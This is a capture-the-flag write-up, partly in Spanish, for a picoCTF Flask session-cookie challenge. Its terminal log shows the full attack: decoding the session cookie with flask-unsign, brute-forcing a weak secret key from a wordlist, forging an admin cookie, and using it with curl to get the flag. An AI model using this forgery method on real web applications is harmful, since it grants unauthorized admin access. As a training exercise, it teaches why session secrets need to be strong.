## Descripción 
Alright, enough of using my own encryption. Flask session cookies should be plenty secure!

http://wily-courier.picoctf.net:64696/
## Solución 
```
Son69-academy@webshell:~$ export PATH="$HOME/.local/bin:$PATH"
Son69-academy@webshell:~$ cat > cookielist.txt <<'EOF'
> snickerdoodle
> chocolate chip
> oatmeal raisin
> gingersnap
> shortbread
> peanut butter
> whoopie pie
> sugar
> molasses
> kiss
> biscotti
> butter
> spritz
> snowball
> drop
> thumbprint
> pinwheel
> wafer
> macaroon
> fortune
> crinkle
> icebox
> gingerbread
> tassie
> lebkuchen
> macaron
> black and white
> white chocolate macadamia
> EOF
Son69-academy@webshell:~$ flask-unsign --decode --server 'http://wily-courier.picoctf.net:65094/'
[*] Server returned HTTP 302 (FOUND)
[+] Successfully obtained session cookie: eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.arHstg.3ZQbFvpHGIziACCgDAV00du8raY
{'very_auth': 'blank'}
Son69-academy@webshell:~$ flask-unsign --unsign \
>   --server 'http://wily-courier.picoctf.net:65094/' \
>   --wordlist cookielist.txt
[*] Server returned HTTP 302 (FOUND)
[+] Successfully obtained session cookie: eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.arHtew.8yvnjkWKtADLiY7d-p6TX4y2j1w
[*] Session decodes to: {'very_auth': 'blank'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'black and white'
Son69-academy@webshell:~$ flask-unsign --sign \ --cookie "{'very_auth': 'admin'}" \ --secret 'black and white'
usage: flask-unsign [-h] [-d] [-u] [-s] [-l] [-c [COOKIE]] [--secret SECRET] [--salt SALT] [--wordlist WORDLIST] [--threads THREADS] [--no-literal-eval] [--server SERVER] [--insecure] [-o OUTPUT] [-p PROXY] [--cookie-name COOKIE_NAME]
                    [-U USER_AGENT] [-q] [-C CHUNK_SIZE] [-v]
flask-unsign: error: unrecognized arguments:  --cookie {'very_auth': 'admin'}  --secret black and white
Son69-academy@webshell:~$ flask-unsign --sign \
>   --cookie "{'very_auth': 'admin'}" \
>   --secret 'black and white'
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.arHudw.iOVwx884QrQYydZirg5OT-HTrpc
Son69-academy@webshell:~$ curl -s \
>   -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.arHudw.iOVwx884QrQYydZirg5OT-HTrpc" \
>   'http://wily-courier.picoctf.net:65094/display'
```
picoCTF{cO0ki3s_yum_b8d261f0}
## Notas adicionales 
*  Una **Flask session cookie no debe confundirse con una cookie cifrada**. El contenido de la sesión puede estar serializado y firmado, pero la seguridad depende de que el `secret_key` sea realmente secreto, aleatorio y suficientemente resistente a ataques de fuerza bruta.
## Referencias
* ChatGPT